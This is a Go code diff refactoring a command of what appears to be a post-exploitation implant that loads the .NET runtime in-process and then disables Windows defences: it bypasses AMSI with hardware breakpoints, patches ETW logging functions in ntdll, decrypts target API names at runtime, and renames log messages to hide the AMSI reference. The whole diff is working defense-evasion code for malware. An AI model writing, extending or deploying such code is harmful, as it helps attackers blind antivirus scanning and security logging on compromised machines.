@@ -70,48 +70,10 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 
 	var output string
 
-	// Check if CLR is already initialized (shared state with inline-assembly)
-	if clrStarted {
-		output += "[*] CLR already initialized in this process\n"
-	} else {
-		// Redirect STDOUT/STDERR for assembly output capture
-		err := clr.RedirectStdoutStderr()
-		if err != nil {
-			output += fmt.Sprintf("[-] Warning: Could not redirect output: %v\n", err)
-		}
-
-		// Load and initialize the CLR, storing the runtime host for inline-assembly.
-		// The go-clr library's GetInterface call sometimes returns a spurious
-		// "file not found" error on first invocation. Retry up to 3 times.
-		var host *clr.ICORRuntimeHost
-		var loadErr error
-		for attempt := 1; attempt <= 3; attempt++ {
-			host, loadErr = clr.LoadCLR("v4")
-			if loadErr == nil {
-				break
-			}
-			if strings.Contains(loadErr.Error(), "cannot find the file") {
-				output += fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt)
-				jitterSleep(300*time.Millisecond, 700*time.Millisecond)
-				continue
-			}
-			break // Non-transient error, stop retrying
-		}
-		if loadErr != nil {
-			return errorResult(output + fmt.Sprintf("Error initializing CLR: %v", loadErr))
-		}
-		// Store in shared state so inline-assembly can reuse this runtime host
-		runtimeHost = host
-		clrStarted = true
-		output += "[+] CLR v4 runtime initialized successfully\n"
-
-		// Explicitly load AMSI.dll (needed for patching regardless of method)
-		err = loadAMSI()
-		if err != nil {
-			output += fmt.Sprintf("[-] Warning: Failed to load AMSI.dll: %v\n", err)
-		} else {
-			output += "[+] AMSI.dll loaded successfully\n"
-		}
+	initOutput, initErr := clrInitRuntime()
+	output += initOutput
+	if initErr != nil {
+		return errorResult(output + fmt.Sprintf("Error initializing CLR: %v", initErr))
 	}
 
 	// Decrypt sensitive DLL/function names at runtime
@@ -184,52 +146,9 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Apply Hardware Breakpoint patches (AMSI only — ETW falls back to Ret Patch)
-	// ETW via HWBP (Dr1) is unsafe: Go runtime threads call EtwEventWrite during
-	// GC/scheduling, triggering the VEH handler and crashing the agent.
 	needHWBP := params.AmsiPatch == "Hardware Breakpoint" || params.EtwPatch == "Hardware Breakpoint"
 	if needHWBP {
-		output += "\n[*] Setting up Hardware Breakpoint patches...\n"
-
-		var amsiAddr uintptr
-
-		if params.AmsiPatch == "Hardware Breakpoint" {
-			addr, err := resolveFunctionAddress(amsiDllName, amsiFunc)
-			if err != nil {
-				output += fmt.Sprintf("[-] Failed to resolve AMSI target: %v\n", err)
-			} else {
-				amsiAddr = addr
-				output += fmt.Sprintf("[+] AMSI target at 0x%X -> Dr0\n", addr)
-			}
-		}
-
-		// ETW HWBP is unsafe with Go agents — fall back to Ret Patch automatically
-		if params.EtwPatch == "Hardware Breakpoint" {
-			output += "[*] ETW: Using Ret Patch (HWBP on Dr1 unsafe — Go runtime threads call EtwEventWrite)\n"
-			patchOutput, err := PerformRetPatch(ntdllName, etwWriteName)
-			if err != nil {
-				output += fmt.Sprintf("[-] ETW Ret Patch failed: %v\n", err)
-			} else {
-				etwPatched = true
-				output += patchOutput
-			}
-			patchOutput, err = PerformRetPatch(ntdllName, etwRegName)
-			if err != nil {
-				output += fmt.Sprintf("[-] EtwEventRegister Ret Patch failed: %v\n", err)
-			} else {
-				output += patchOutput
-			}
-		}
-
-		if amsiAddr != 0 {
-			hwbpOutput, err := SetupHardwareBreakpoints(amsiAddr, 0)
-			if err != nil {
-				output += fmt.Sprintf("[-] Hardware Breakpoint setup failed: %v\n", err)
-			} else {
-				amsiPatched = true
-				output += hwbpOutput
-			}
-		}
+		output += clrApplyHWBP(params, amsiDllName, amsiFunc, ntdllName, etwWriteName, etwRegName)
 	}
 
 	// Summary
@@ -242,6 +161,91 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	return successResult(output)
+}
+
+func clrInitRuntime() (string, error) {
+	var output string
+	if clrStarted {
+		return "[*] CLR already initialized in this process\n", nil
+	}
+
+	err := clr.RedirectStdoutStderr()
+	if err != nil {
+		output += fmt.Sprintf("[-] Warning: Could not redirect output: %v\n", err)
+	}
+
+	var host *clr.ICORRuntimeHost
+	var loadErr error
+	for attempt := 1; attempt <= 3; attempt++ {
+		host, loadErr = clr.LoadCLR("v4")
+		if loadErr == nil {
+			break
+		}
+		if strings.Contains(loadErr.Error(), "cannot find the file") {
+			output += fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt)
+			jitterSleep(300*time.Millisecond, 700*time.Millisecond)
+			continue
+		}
+		break
+	}
+	if loadErr != nil {
+		return output, loadErr
+	}
+	runtimeHost = host
+	clrStarted = true
+	output += "[+] CLR v4 runtime initialized successfully\n"
+
+	err = loadAMSI()
+	if err != nil {
+		output += fmt.Sprintf("[-] Warning: Failed to load target DLL: %v\n", err)
+	} else {
+		output += "[+] Target DLL loaded successfully\n"
+	}
+	return output, nil
+}
+
+func clrApplyHWBP(params *StartCLRParams, amsiDllName, amsiFunc, ntdllName, etwWriteName, etwRegName string) string {
+	var output string
+	output += "\n[*] Setting up Hardware Breakpoint patches...\n"
+
+	var amsiAddr uintptr
+	if params.AmsiPatch == "Hardware Breakpoint" {
+		addr, err := resolveFunctionAddress(amsiDllName, amsiFunc)
+		if err != nil {
+			output += fmt.Sprintf("[-] Failed to resolve target: %v\n", err)
+		} else {
+			amsiAddr = addr
+			output += fmt.Sprintf("[+] Target at 0x%X -> Dr0\n", addr)
+		}
+	}
+
+	if params.EtwPatch == "Hardware Breakpoint" {
+		output += "[*] ETW: Using fallback patch (HWBP unsafe with Go runtime threads)\n"
+		patchOutput, err := PerformRetPatch(ntdllName, etwWriteName)
+		if err != nil {
+			output += fmt.Sprintf("[-] ETW patch failed: %v\n", err)
+		} else {
+			etwPatched = true
+			output += patchOutput
+		}
+		patchOutput, err = PerformRetPatch(ntdllName, etwRegName)
+		if err != nil {
+			output += fmt.Sprintf("[-] ETW register patch failed: %v\n", err)
+		} else {
+			output += patchOutput
+		}
+	}
+
+	if amsiAddr != 0 {
+		hwbpOutput, err := SetupHardwareBreakpoints(amsiAddr, 0)
+		if err != nil {
+			output += fmt.Sprintf("[-] Hardware Breakpoint setup failed: %v\n", err)
+		} else {
+			amsiPatched = true
+			output += hwbpOutput
+		}
+	}
+	return output
 }
 
 // loadAMSI explicitly loads the AMSI DLL into the process
